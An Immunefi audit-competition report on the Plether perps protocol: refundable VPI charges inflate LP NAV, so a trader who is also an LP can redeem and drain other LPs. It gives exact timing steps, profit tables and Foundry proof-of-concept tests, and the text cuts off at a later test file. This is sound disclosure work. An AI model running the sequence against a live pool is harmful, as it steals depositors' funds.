# \#97670 [SC-Critical] Collected VPI charges counted as LP equity while still refundable let a redeeming LP take other LPs' funds

**Submitted on Nov 2nd 2026 at 16:01:53 UTC by @LT3513 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97670
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

A positive VPI (virtual price impact) charge goes into `HousePool` as LP revenue as soon as a skew-increasing trade opens. Junior and senior LP deposits and redemptions are priced on that NAV. But the charge is refundable: when the position closes and reverses the skew, the engine pays a rebate back to the trader from pool cash, capped by the lifetime clamp at the charge (and equal to it when the trader reverses its own skew at equal or lower depth). NAV marks no liability for this pending refund. So an LP who redeems while the position is open leaves with its share of money that the LPs who stay (or who join meanwhile) must repay. The mirror case also holds: a rebate paid at open is later clawed back, and the clawback is not in NAV, so an LP who enters after the rebate and leaves after the close captures a share of it.

A trader who is also a junior LP turns this into a repeatable, profitable value transfer at the deployed parameters. In one LP epoch the other junior LPs lose **2,526.06 USDG** (0.25 % of their capital, ending below their starting balance) and the attacker nets **+706.84 USDG**. A timing variant holds the position for only **31 seconds** around the epoch boundary (+724.23 / −2,543.45). Through the public Router order path (`commitOrder` / permissionless `executeOrder`) the same timing variant, with the position open 41 seconds, nets **+724.20** for the attacker and **−2,543.45** for the other junior LPs — the Router adds no rule that blocks it; a 1–2 h hold through the Router still nets +247.68 per cycle and compounds across cycles. With no attacker at all, an LP who exits while a large position is open gains **+3,194.52 USDG** over the same exit made after the close, with depth held flat. The LP who enters in that epoch pays it (−3,191.45).

## Vulnerability Details

Pin `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, `packages/perps`.

**1. At open, the charge becomes LP revenue immediately.** `src/CfdEngineSettlementSidecar.sol:446-461`: after the treasury's execution-fee share, the rest of the trade cost, including the positive VPI, is booked as `ClaimantInflowKind.Revenue` with `CashArrived`. The position records the same amount in `position.vpiAccrued`. Junior NAV is `TrancheVault.totalAssets()` → `HousePool.getPendingTrancheState()` (`src/TrancheVault.sol:510-513`). It contains this revenue at once, and the next hourly epoch (`LP_EPOCH_DURATION = 1 hours`, `src/HousePool.sol:178`) settles redemptions and deposits on it.

**2. At close, the rebate refunds the charge from pool cash, capped by the lifetime clamp.** `src/libraries/CloseAccountingLib.sol:103-118`:

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor);
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

A trader who reverses its own skew receives the plain curve rebate `k·S²/(2·D_close)`, capped at its lifetime charge. With no intervening skew change, at equal or lower depth, that is exactly the charge; at slightly higher depth it is slightly less (−7,991.15 vs a 7,998.40 charge in the flat-depth test). The refund is contingent, not certain: it is smaller if depth grows or other traders reduce the skew first, it is waived if pool cash is not free, and liquidation computes no fresh VPI. The pool pays it (`CfdEngineSettlementSidecar.sol:621-623`, `payOut` then `settleAssets`), whichever LPs happened to receive the charge.

**3. NAV marks no liability for the refund.** The symmetric marked NAV (`ACCOUNTING_SPEC.md:158-176`) is `physicalAssets − totalTraderClaimBalanceAssets + terminalLpPriceDeltaAssets`. It has no VPI term. `SECURITY.md:863`: "carry, VPI, fees, frozen spread, and liquidation charges stay outside the pre-close price book". `SECURITY.md:871-872`: "neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV".

**4. The protocol already protects the opposite direction.** A negative lifetime VPI (a rebate already received) is backed 1:1 by a non-withdrawable reserve so that LPs cannot withdraw it as marked equity (`SECURITY.md:297-298, 866-868`; `src/MarginClearinghouse.sol` negative-lifetime-VPI floor). A positive lifetime VPI (a charge already collected and still refundable) has no counterpart. `Σ max(vpiAccrued_i, 0)` sits inside the NAV that a redeeming LP is paid.

The NAV design aims at symmetric pricing between LP cohorts. `ACCOUNTING_SPEC.md:173`: "an entrant receives the same discount for inherited marked liabilities that an exiting LP bears". `SECURITY.md:857-858`: new LPs "do not inherit old trader obligations at a higher deposit NAV". That symmetry is implemented only for the marked price book. VPI is deliberately left out (`SECURITY.md:863, 871-872`), so the pending VPI refund is an old trader obligation that an entrant inherits at a higher deposit NAV and an exiting LP escapes. No known limitation (`SECURITY.md:1434-1444`) lists this transfer between LP cohorts. The protocol does reserve the negative side for exactly this reason (point 4).

**Attack (trader who is also a junior LP), deployed parameters** (`DEPLOYMENT.md:131-155`: vpiFactor 0.01e18, maxSkewRatio 0.4e18, executionFeeBps 4, maxSeniorShareBps 8,000):
1. Hold junior shares worth A, a fraction f of the junior tranche.
2. Request redemption of those shares before the epoch cutoff (`b − 300 s`; the cutoff freezes only new LP requests, not trading — `ACCOUNTING_SPEC.md:188-229`).
3. About 30 s before the boundary `b`, open a position at the skew cap S = 0.4·D. This pays C = k·S²/(2D) into the pool, plus the 4 bps fee.
4. At `b`, call `OrderRouter.settleLpEpoch` (permissionless) and claim. The redemption is priced on a NAV that includes C, so the attacker receives A + f·C.
5. Close. The rebate equals C (the attacker's own exit lowered depth, so the clamp binds) and is paid by the LPs who remain.

Net per cycle (no initial skew, no intervening trades): attacker ≈ f·C − 2·fee·S; the other junior LPs ≈ −f·C plus the share of fees the pool keeps. This is profitable when f > 4·fee/(k·r) = 4·0.0004/(0.01·0.4) = **0.40** of the junior tranche. The model matches the measured results to about 12 %. At the 80 % senior cap, junior is 20 % of the pool, so 0.40 of junior is 8 % of total pool capital (more when the senior share is lower). One capital stack repeats about every two hours: re-deposit, then the 1 h `DEPOSIT_COOLDOWN` (`TrancheVault.sol:38`) before the next redemption.

**No attacker needed (ordinary LP churn).** Any LP who redeems while a skew-increasing position is open carries out its share of the refundable charge. The PoC holds depth constant: one LP exits while a new LP enters with slightly more assets in the same epoch, so close depth ≥ open depth and the clamp does not bind. Against a control where the same churn happens after the close, the exiting LP gains +3,194.52 USDG and the entrant loses 3,191.45 USDG. Here the LPs who stay are unaffected and the entrant pays. Without an entrant (third-party trader, one LP exits, close 1 h later), the LP who stays loses 2,589.43.

**Mirror leg (same root cause).** A skew-reducing open receives a VPI rebate from pool cash (`CfdEngineSettlementSidecar.sol:442-443`), which lowers NAV. The close claws back the whole rebate into the pool as revenue (`:604-616`). The clawback is guaranteed by the trader's own locked VPI reserve and the same clamp, yet it is not in NAV. An LP who deposits after the rebate and redeems after the close captures a share of the clawback that the other LPs paid for.

**Not the same as the depth-manipulation note in the published scan.** The scan report shipped in `audits/` ("Temporary pool-liquidity reduction can amplify a skew-reducing close rebate", Info) describes a trader who lowers depth right before its own close so that the rebate exceeds the unmanipulated curve. The transfer here needs no depth change and no excess rebate. In the flat-depth test the clamp does not bind and the rebate is the plain curve value, yet the exiting LP still gains +3,194.52 over the control. In the headline attack the attacker's own exit does lower depth and the clamp binds, but that adds only about 7 USDG: the clamped 7,998.40 against the 7,991.15 curve value at flat depth. The rest is NAV pricing. The defect is that LP share prices treat refundable money as already earned. A commit-time or TWAP depth (the natural fix for the scan item) would leave the flat-depth result unchanged.

## Impact Details

The victims are junior LPs who stay in the vault (and LPs who enter while a refundable charge is outstanding). In the PoC they end below their pre-attack balance, not just short of yield (1,000,999.98 → 998,473.92 USDG). Measured with the repository's own harness, no fork. Rows not labeled "Router path" call the engine as the Router through the harness helpers; the three Router-path rows use the public `commitOrder`/`executeOrder` with no prank (the 41 s row holds the position only across the epoch boundary; the 1-/2-cycle rows hold it through the 1 h deposit cooldown and the redemption epoch, 1–2 h per cycle). On the 41 s Router-path row the attacker funds 100,000 USDG margin plus the 4,000 USDG opening-bounty reservation taken from free settlement assets at commit (`src/router/OrderReservationAccounting.sol:124`), released when it executes its own order:

| scenario (deployed params) | attacker / exiting LP | other LPs |
|---|---|---|
| senior 8M, victims 1M junior, attacker 1M junior (f = 0.5), S = 4M | **+706.84** | **−2,526.06** |
| same, position open only 31 s around the epoch boundary | **+724.23** | **−2,543.45** |
| Router path (`commitOrder` → permissionless `executeOrder` one block later, attacker self-executes), position open 41 s around the epoch boundary | **+724.20** | **−2,543.45** |
| no senior, f = 0.5, S = 800k | +155.56 | −475.59 |
| below break-even, f = 0.33 | −83.20 | −156.82 |
| no attacker: third party opens S = 4M, an LP exits next epoch, close 1 h later | exiting LP +3,924.30 above deposit (no control in this run; the flat-depth control shows about +730 of that is ordinary fee share) | remaining LP **−2,589.43** |
| no attacker, depth held flat (exit + equal entry), clamp not binding | exiter +3,194.52 vs control | entrant −3,191.45 vs control |
| Router path (`commitOrder`/`executeOrder`), 1 cycle / 2 cycles | +247.68 / +495.84 | −607.88 / −1,216.24 |
| Router path with 2 bps Pyth confidence | +197.20 | −557.38 |
| mirror leg: rebate at open, LP enters after it | +158.05 | −478.25 (control +0.03) |

At a fixed tranche fraction f, the transfer per cycle grows linearly with pool depth: ≈ f·k·r²·D/2 transferred, ≈ (f − 0.40)·k·r²·D/2 net to the attacker. It needs no privilege and no oracle manipulation. The trader leg can be held for seconds (31 s in the harness timing test, 41 s through the Router), though it still carries price and Pyth-confidence exposure for that time. Victims lose more than the attacker gains (fees to treasury), so the pool is strictly worse off every cycle. There is no insolvency: the funding predicate keeps the open position's maximum liability in the pool, which also caps how much can be redeemed.

**Severity: High.** This is a repeatable, permissionless transfer of LP funds to an attacker, at the deployed parameters and through ordinary user paths, with the remaining LPs ending below their pre-attack balance. It is bounded per cycle, repeatable about every two hours per capital stack, and scales with pool depth.

## References

- `src/CfdEngineSettlementSidecar.sol:442-461, 604-623` — open revenue booking, close clawback revenue, close rebate payout
- `src/libraries/CloseAccountingLib.sol:103-118` — lifetime clamp
- `src/TrancheVault.sol:38, 510-513`, `src/HousePool.sol:178` — deposit cooldown, NAV source, LP epoch
- `ACCOUNTING_SPEC.md:158-176, 188-229` — symmetric NAV, request cutoff
- `SECURITY.md:297-298, 857-858, 863, 866-872, 1434-1444` — negative-VPI reserve, symmetric-NAV promise, VPI limitations
- https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol

## Recommendation

Treat VPI that is still refundable as a pool liability, and VPI that is still claw-backable as a receivable, until the position realizes it. Keep aggregate counters in the engine, updated wherever `vpiAccrued` changes (open/increase, partial close, close, liquidation): `totalPositiveVpiAccrued` and `totalNegativeVpiAccrued`. Subtract the pending refund from, and add the second (already reserve-backed) to, the distributable value in `HousePool`'s tranche-state computation. Because the refund is contingent (smaller after depth growth or third-party skew reduction, none on liquidation), a tighter bound is `min(Σ max(vpiAccrued_i, 0), C(S_now, D_now))`, the most the current open interest can be refunded at current depth. Deposits and redemptions then price at a NAV that already includes the refund or clawback, and a close moves NAV only by the realized net VPI. An alternative is to hold VPI charges in a dedicated impact pool that funds rebates and releases only the realized net to LP revenue on close (as GMX v2's position-impact pool does).


## Proof of Concept

## Proof of Concept

Local Foundry tests against the repository's own harness (`test/perps/BasePerpTest.sol`) at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Pyth is mocked, with no fork and no RPC. No source file is modified.

**Setup**
```bash
git clone https://github.com/immunefi-team/audit-comp-plether && cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8 && git submodule update --init --recursive
mkdir -p packages/perps/test/poc/vpi   # put the files below in this folder (the full set of six, adding VpiLpExitTiming and the two Router-path PoCs, is attached)
cd packages/perps
forge test --offline --match-path 'test/poc/vpi/*' -vv
```
Expected with these three files: `7 tests passed, 0 failed` (all six files: 11 tests; full output below, including `VpiLpExitTiming_RouterPath`, the Router-path twin of `VpiLpExitTiming` with the position open 41 s; its source is in the attached `poc/` and in the long PoC). Every test asserts its claim (attacker profit, the other LPs' loss, a full-funded redemption, depth not reduced, and so on).

Parameters are the deployed ones (`DEPLOYMENT.md`): vpiFactor 0.01e18, maxSkewRatio 0.4e18, executionFeeBps 4, senior 8,000,000 at the 80 % share cap where stated. Two harness differences, neither affecting VPI or NAV: `VpiLpExitCapture`/`VpiLpExitTiming` use stricter margin bps (100/150 instead of the deployed 10/20), and the harness oracle's `adverseConfidenceMultiplierBps` is 2,000 (deployed 2,500). `VpiLpExitCapture`/`VpiLpExitTiming` call the engine as the Router through the harness helpers. `VpiDepthNeutralChurn`, `VpiChargeLpExitCapture_RouterPath` and `VpiRebateClawbackLpEntryCapture` go through the public `OrderRouter.commitOrder`/`executeOrder` path. All LP actions use the public `TrancheVault.requestRedeem`/`claimRedeem`/`requestDeposit`/`claimDeposit` and `OrderRouter.settleLpEpoch`. USDG has 6 decimals (atoms ÷ 1e6 = USDG).

### 1. `test/poc/vpi/VpiLpExitCapture.t.sol` — Attacker who is trader + junior LP (no senior; senior at the 80 % cap; below break-even) and the pure-LP form with no attacker

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";

/// @notice VPI charge captured by an exiting LP, at DEPLOYED parameters (DEPLOYMENT.md: vpiFactor 0.01e18,
///         maxSkewRatio 0.4e18, executionFeeBps 4). Question: does an attacker who is both trader and junior LP
///         walk away with other LPs' money by (1) paying a VPI charge that lands in LP NAV at once, (2) redeeming
///         its LP shares at that NAV, (3) closing and taking the lifetime-clamped rebate from the remaining LPs?
///         Also measured: what the funding predicate lets the attacker LP actually redeem, and the victims' loss.
abstract contract VpiLpExitCaptureBase is BasePerpTest {

    address internal constant ATT = address(0xA770011);
    address internal constant ATT_LP = address(0xA770012);
    address internal constant OTHER_TRADER = address(0xA770013);
    uint256 internal constant PRICE = 1e8;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 100,
            initMarginBps: 150,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// victims: 1,000,000 USDG of junior capital (BasePerpTest default) + 1,000 seed
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _netDepth() internal view returns (uint256) {
        uint256 gross = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return gross > claims ? gross - claims : 0;
    }

    function _vpiAccrued(address a) internal view returns (int256 v) {
        (,,,,,, v) = engine.positions(a);
    }

    function _skew(uint256 size) internal pure returns (uint256) {
        return (size * PRICE) / CfdMath.ASSETS_TO_TOKEN_SCALE;
    }

    /// Redeem ALL junior shares of `lp`; returns proceeds and how much of the request the epoch funded.
    function _redeemAllJunior(address lp) internal returns (uint256 proceeds, uint256 fundedShares, uint256 shares) {
        shares = juniorVault.balanceOf(lp);
        uint256 cooldownEnd = juniorVault.lastDepositTime(lp) + juniorVault.DEPOSIT_COOLDOWN();
        if (block.timestamp < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        uint256 balBefore = settlementToken.balanceOf(lp);
        vm.prank(lp);
        uint256 requestId = juniorVault.requestRedeem(shares, lp, lp);
        vm.warp(juniorVault.depositEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        fundedShares = juniorVault.claimableRedeemRequest(requestId, lp);
        if (fundedShares > 0) {
            vm.prank(lp);
            juniorVault.claimRedeem(requestId, fundedShares, lp, lp);
        }
        proceeds = settlementToken.balanceOf(lp) - balBefore;
    }

    function _run(uint256 attLp, uint256 size, uint256 margin) internal returns (int256 combined, int256 victimsDelta) {
        uint256 victimsBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        _fundJunior(ATT_LP, attLp);
        uint256 depth = _netDepth();
        _fundTrader(ATT, margin + 1_000e6);
        uint256 attStart = _settlementBalance(ATT);
        _open(ATT, CfdTypes.Side.LONG, size, margin, PRICE, depth);
        int256 openVpi = _vpiAccrued(ATT);
        uint256 openFee = (_skew(size) * engine.executionFeeBps()) / 10_000;

        uint256 poolAfterOpen = pool.totalAssets();
        uint256 t0 = block.timestamp;
        (uint256 lpProceeds, uint256 funded, uint256 shares) = _redeemAllJunior(ATT_LP);
        uint256 poolAfterRedeem = pool.totalAssets();
        uint256 shallow = _netDepth();
        ICfdEngineTypes.ClosePreview memory pv = engineLens.previewClose(ATT, size, PRICE);
        emit log_named_uint("seconds_held", block.timestamp - t0);
        emit log_named_uint("pool_after_open", poolAfterOpen);
        emit log_named_uint("pool_after_redeem", poolAfterRedeem);
        emit log_named_int("close_vpiDelta_preview", pv.vpiDeltaAssets);
        emit log_named_uint("close_fee_preview", pv.executionFeeAssets);
        emit log_named_int("close_realizedPnl_preview", pv.realizedPnlAssets);
        _close(ATT, CfdTypes.Side.LONG, size, PRICE, shallow);
        emit log_named_uint("pool_after_close", pool.totalAssets());
        (uint256 sizeAfter,,,,,,) = engine.positions(ATT);
        uint256 attEnd = _settlementBalance(ATT) + engine.traderClaimBalanceAssets(ATT);
        uint256 victimsAfter = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));

        emit log_named_uint("depth_at_open", depth);
        emit log_named_uint("skew_assets", _skew(size));
        emit log_named_int("openVpi_charge", openVpi);
        emit log_named_uint("openFee", openFee);
        emit log_named_uint("lp_shares", shares);
        emit log_named_uint("lp_shares_funded", funded);
        emit log_named_uint("lp_deposit", attLp);
        emit log_named_uint("lp_proceeds", lpProceeds);
        emit log_named_uint("sizeAfter", sizeAfter);
        emit log_named_uint("att_trader_start", attStart);
        emit log_named_uint("att_trader_end", attEnd);
        assertEq(funded, shares, "attacker LP redemption fully funded");
        assertEq(sizeAfter, 0, "position fully closed");
        combined = int256(attEnd + lpProceeds) - int256(attStart + attLp);
        emit log_named_int("ATTACKER_COMBINED_PNL", combined);
        emit log_named_uint("victims_before", victimsBefore);
        emit log_named_uint("victims_after", victimsAfter);
        victimsDelta = int256(victimsAfter) - int256(victimsBefore);
        emit log_named_int("VICTIMS_DELTA", victimsDelta);
    }
}

/// @notice No senior tranche. Junior victims 1,000,000 (+ seed); skew at the cap 0.4 x depth.
contract VpiLpExitCapture_NoSenior is VpiLpExitCaptureBase {
    /// attacker junior 1M (f = 0.5, above the 0.40 break-even): attacker profits, other junior LPs lose.
    function test_noSenior_f50_maxSkew() public {
        (int256 attacker, int256 victims) = _run(1_000_000e6, 800_000e18, 50_000e6);
        assertGt(attacker, 0, "attacker (trader + junior LP) nets a profit");
        assertLt(victims, 0, "remaining junior LPs end below their starting value");
    }

    /// attacker junior 500k (f = 0.33, below break-even): the attack does not pay, but the remaining LPs still lose.
    function test_noSenior_f33_belowBreakEven() public {
        (int256 attacker, int256 victims) = _run(500_000e6, 600_000e18, 40_000e6);
        assertLt(attacker, 0, "below f = 0.40 the attacker loses its fees");
        assertLt(victims, 0, "remaining junior LPs still lose");
    }
}

/// @notice Same attack with a senior tranche at the deployed 80 % share cap: VPI depth counts senior capital,
///         junior NAV absorbs the VPI charge and the later rebate.
contract VpiLpExitCapture_Senior80 is VpiLpExitCaptureBase {
    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 8_000_000e6;
    }

    /// junior victims 1M, attacker junior 1M, senior 8M → depth ~10M, skew 4M (0.4 x depth)
    function test_senior80_f50junior_maxSkew() public {
        (int256 attacker, int256 victims) = _run(1_000_000e6, 4_000_000e18, 100_000e6);
        assertGt(attacker, 0, "attacker (trader + junior LP) nets a profit");
        assertLt(victims, 0, "remaining junior LPs end below their starting value");
    }

    /// junior victims 1M, attacker junior 250k, senior 8M → depth ~9.25M, skew 3.7M
    function test_senior80_f20junior_belowBreakEven() public {
        (int256 attacker, int256 victims) = _run(250_000e6, 3_700_000e18, 100_000e6);
        assertLt(attacker, 0, "below f = 0.40 the attacker loses its fees");
        assertLt(victims, 0, "remaining junior LPs still lose");
    }
}

/// @notice Pure-LP form (no attacker): a third party opens at the skew cap, an uninvolved junior LP redeems in
///         the next epoch, the trader closes one hour later (carry accrues). Deployed params, senior 80 %.
contract VpiPureLpExit_Senior80 is VpiLpExitCaptureBase {
    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 8_000_000e6;
    }

    function test_pure_lp_exit_1h_carry() public {
        uint256 victimsBefore = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        _fundJunior(ATT_LP, 1_000_000e6); // "exiting LP": uninvolved, f_j = 0.5
        uint256 depth = _netDepth();
        _fundTrader(OTHER_TRADER, 101_000e6);
        uint256 trStart = _settlementBalance(OTHER_TRADER);
        _open(OTHER_TRADER, CfdTypes.Side.LONG, 4_000_000e18, 100_000e6, PRICE, depth);
        int256 openVpi = _vpiAccrued(OTHER_TRADER);
        (uint256 lpProceeds, uint256 funded, uint256 shares) = _redeemAllJunior(ATT_LP);
        vm.warp(block.timestamp + 1 hours);
        _close(OTHER_TRADER, CfdTypes.Side.LONG, 4_000_000e18, PRICE, _netDepth());
        uint256 trEnd = _settlementBalance(OTHER_TRADER) + engine.traderClaimBalanceAssets(OTHER_TRADER);
        uint256 victimsAfter = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        emit log_named_int("openVpi_charge", openVpi);
        emit log_named_uint("lp_shares_funded_of", funded);
        emit log_named_uint("lp_shares", shares);
        emit log_named_uint("exiting_lp_proceeds_minus_deposit", lpProceeds - 1_000_000e6);
        emit log_named_int("third_party_trader_pnl", int256(trEnd) - int256(trStart));
        emit log_named_int("REMAINING_LPS_DELTA", int256(victimsAfter) - int256(victimsBefore));
        assertEq(funded, shares, "exit fully funded");
        assertGt(lpProceeds, 1_000_000e6, "exiting LP leaves with more than its deposit");
        assertLt(victimsAfter, victimsBefore, "remaining junior LP ends below its starting value");
    }
}
```

### 3. `test/poc/vpi/VpiDepthNeutralChurn.t.sol` — No attacker, depth held flat (exit + larger entry in one epoch), lifetime clamp not binding

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdMath} from "@plether/perps/CfdMath.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Does the VPI LP-NAV transfer need ANY depth reduction before the close?
///         An honest trader opens a skew-increasing long through the Router. In the next LP epoch one junior LP
///         exits and a new junior LP enters with slightly MORE assets, so pool depth at the close is not lower than
///         at the open and the lifetime clamp does not bind (the close rebate is the plain curve value). No party is
///         an attacker; the entrant pays. Every call is a public entry point (Router commit/execute, TrancheVault request/claim,
///         Router.settleLpEpoch). Deployed parameters (DEPLOYMENT.md: vpiFactor 0.01e18, maxSkewRatio 0.4e18,
///         maint/init 10/20 bps, executionFeeBps 4), senior 8,000,000 at the 80 % share cap.
contract VpiDepthNeutralChurn is BasePerpTest {
    address internal constant TRADER = address(0xBEEF_0001);
    address internal constant KEEPER = address(0xBEEF_0002);
    address internal constant EXITER = address(0xBEEF_0003);
    address internal constant ENTRANT = address(0xBEEF_0004);
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant SIZE = 4_000_000e18;
    uint256 internal constant MARGIN = 100_000e6;
    uint256 internal constant LP = 1_000_000e6;
    uint256 internal constant ENTRY = 1_005_000e6; // > LP + the exiter's expected gain: depth does not fall

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 1_000_000e6;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 8_000_000e6;
    }

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(int256(price)), 0, int32(-8), publishTime, publishTime - 1);
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _netDepth() internal view returns (uint256) {
        uint256 gross = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return gross > claims ? gross - claims : 0;
    }

    function _trade(
        bool isClose
    ) internal {
        uint64 id = router.nextCommitId();
        vm.prank(TRADER);
        router.commitOrder(CfdTypes.Side.LONG, SIZE, isClose ? 0 : MARGIN, 0, isClose);
        vm.prank(KEEPER);
        router.executeOrder(id, _pyth(PRICE));
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, isClose ? 0 : SIZE, isClose ? "close executed" : "open executed");
    }

    function _victims() internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
    }

    /// Exit + entry in one epoch; returns (exiter proceeds, entrant shares).
    function _churn() internal returns (uint256 exitProceeds, uint256 entrantShares) {
        uint256 shares = juniorVault.balanceOf(EXITER);
        vm.prank(EXITER);
        uint256 rid = juniorVault.requestRedeem(shares, EXITER, EXITER);
        vm.startPrank(ENTRANT);
        settlementToken.approve(address(juniorVault), ENTRY);
        uint256 did = juniorVault.requestDeposit(ENTRY, ENTRANT, ENTRANT);
        vm.stopPrank();
        uint256 b = juniorVault.depositEpochStart(rid);
        assertEq(b, juniorVault.depositEpochStart(did), "exit and entry settle in the same epoch");
        vm.warp(b);
        router.settleLpEpoch(_pyth(PRICE));
        assertEq(juniorVault.claimableRedeemRequest(rid, EXITER), shares, "exit fully funded");
        assertEq(juniorVault.claimableDepositRequest(did, ENTRANT), ENTRY, "entry activated");
        uint256 before = settlementToken.balanceOf(EXITER);
        vm.prank(EXITER);
        juniorVault.claimRedeem(rid, shares, EXITER, EXITER);
        exitProceeds = settlementToken.balanceOf(EXITER) - before;
        vm.prank(ENTRANT);
        entrantShares = juniorVault.claimDeposit(did, ENTRY, ENTRANT, ENTRANT);
    }

    function _setup() internal {
        _fundJunior(EXITER, LP);
        settlementToken.mint(ENTRANT, ENTRY);
        _fundTrader(TRADER, MARGIN + 50_000e6);
        uint256 cooldownEnd = juniorVault.lastDepositTime(EXITER) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) vm.warp(cooldownEnd);
        router.updateMarkPrice(_pyth(PRICE));
    }

    function test_DepthNeutralChurn_ExiterTakesRefundableVpi() public {
        _setup();
        uint256 victims0 = _victims();
        uint256 snap = vm.snapshotState();

        // ---- control: same trade, same LP churn, but the churn happens AFTER the close
        _trade(false);
        _trade(true);
        (uint256 cExit, uint256 cShares) = _churn();
        int256 cExiter = int256(cExit) - int256(LP);
        int256 cEntrant = int256(juniorVault.convertToAssets(cShares)) - int256(ENTRY);
        int256 cVictims = int256(_victims()) - int256(victims0);
        vm.revertToState(snap);

        // ---- churn while the position is open
        uint256 depth0 = _netDepth();
        _trade(false);
        (,,,,,, int256 openVpi) = engine.positions(TRADER);
        (uint256 exitProceeds, uint256 entrantShares) = _churn();
        uint256 depthClose = _netDepth();
        uint256 skew = (SIZE * PRICE) / CfdMath.ASSETS_TO_TOKEN_SCALE;
        int256 curveClose = CfdMath.calculateVPI(skew, 0, depthClose, 0.01e18); // unclamped close VPI
        _trade(true);
        int256 exiter = int256(exitProceeds) - int256(LP);
        int256 entrant = int256(juniorVault.convertToAssets(entrantShares)) - int256(ENTRY);
        int256 victims = int256(_victims()) - int256(victims0);

        emit log_named_uint("depth_at_open", depth0);
        emit log_named_uint("depth_at_close", depthClose);
        emit log_named_int("open_vpi_charge", openVpi);
        emit log_named_int("close_vpi_curve_unclamped", curveClose);
        emit log_named_int("control_exiter_vs_deposit", cExiter);
        emit log_named_int("control_entrant_vs_deposit", cEntrant);
        emit log_named_int("control_remaining_lp_delta", cVictims);
        emit log_named_int("EXITER_vs_deposit", exiter);
        emit log_named_int("ENTRANT_vs_deposit", entrant);
        emit log_named_int("REMAINING_LP_delta", victims);
        emit log_named_int("EXITER_gain_vs_control", exiter - cExiter);
        emit log_named_int("ENTRANT_loss_vs_control", cEntrant - entrant);

        assertGt(openVpi, 0, "open paid a VPI charge");
        assertGe(depthClose, depth0, "no depth reduction between open and close");
        assertGe(curveClose + openVpi, 0, "lifetime clamp does not bind: the close rebate is the plain curve value");
        assertGt(exiter, cExiter, "exiter leaves with part of the refundable charge");
        assertLt(entrant, cEntrant, "entrant buys NAV that still contains the refundable charge");
        // with exit and entry offsetting, the remaining LP's share of the refund is unchanged; the refund the exiter
        // escaped is paid by the entrant, who bought NAV that still contained it
        assertApproxEqRel(exiter - cExiter, cEntrant - entrant, 0.01e18, "exiter's extra gain == entrant's extra loss");
    }
}
```

### 5. `test/poc/vpi/VpiRebateClawbackLpEntryCapture.t.sol` — Mirror leg: rebate at open, LP enters after it, clawback at close

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";

/// @notice Mirror leg (same root cause as the charge/exit leg). A skew-reducing open receives a VPI rebate
